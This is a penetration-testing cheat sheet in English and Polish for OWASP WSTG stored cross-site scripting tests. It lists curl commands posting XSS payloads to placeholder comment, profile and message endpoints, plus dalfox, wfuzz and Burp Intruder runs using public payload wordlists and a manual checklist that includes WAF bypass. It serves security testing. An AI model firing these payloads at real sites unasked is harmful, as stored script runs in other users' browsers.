# WSTG-INPV-02 — Testing for Stored Cross Site Scripting

## Cele

- Identify stored input that is reflected on the client-side
- Assess the input they accept and the encoding that gets applied on return

## KOMENDY

### Testowanie stored XSS w typowych polach

```bash
# Komentarze, profile, wiadomosci, formularze kontaktowe, tytuly
curl -X POST "https://TARGET/comment" -d "body=<script>alert('XSS')</script>" -H "Cookie: session=SESSION_TOKEN"
curl -X POST "https://TARGET/profile" -d "name=<img src=x onerror=alert(1)>" -H "Cookie: session=SESSION_TOKEN"
curl -X POST "https://TARGET/message" -d "content=<svg/onload=alert(1)>" -H "Cookie: session=SESSION_TOKEN"

```

### Testowanie z roznym kontekstem

```bash
curl -X POST "https://TARGET/comment" -d "body=\"onmouseover=\"alert(1)\"" -H "Cookie: session=SESSION_TOKEN"
curl -X POST "https://TARGET/comment" -d "body=javascript:alert(1)" -H "Cookie: session=SESSION_TOKEN"

```

### Sprawdzenie czy payload jest zapisany

```bash
curl -s "https://TARGET/comments" | grep -i "alert\|onerror\|onload\|onmouseover"

```

### dalfox w trybie stored

```bash
dalfox url "https://TARGET/comment" -X POST -d "body=FUZZ" --cookie "session=SESSION_TOKEN" -o output_dalfox_stored.txt

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings XSS payloads

```bash
# Uzyj w Burp Intruder na polach stored (komentarze, profile itp.)
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/JHADDIX_XSS.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/XSS_Polyglots.txt

```

### wfuzz stored XSS

```bash
wfuzz -c -z file,"Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt" -X POST -d "body=FUZZ" -b "session=SESSION_TOKEN" "https://TARGET/comment"

```

### SecLists XSS payloads

```bash
wfuzz -c -z file,"Desktop/WSTG/SecLists-master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt" -X POST -d "body=FUZZ" -b "session=SESSION_TOKEN" "https://TARGET/comment"

```

### fuzzdb XSS

```bash
wfuzz -c -z file,Desktop/WSTG/fuzzdb-master/attack/xss/xss-rsnake.txt -X POST -d "body=FUZZ" -b "session=SESSION_TOKEN" "https://TARGET/comment"

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj wszystkie pola ktore zapisuja dane (komentarze, profile, wiadomosci)
2. Wstaw unikalny string canary w kazde pole i sprawdz gdzie jest wyswietlany
3. Sprawdz kontekst wyswietlania: HTML, atrybut, JS, CSS
4. Wstaw payload XSS i sprawdz czy jest zapisany i renderowany
5. Testuj rozne kodowania i bypass WAF
6. Sprawdz czy payload wykonuje sie dla innych uzytkownikow
7. Testuj file upload z XSS w nazwie pliku lub metadanych (EXIF)
8. Sprawdz rich text editors i markdown parsery

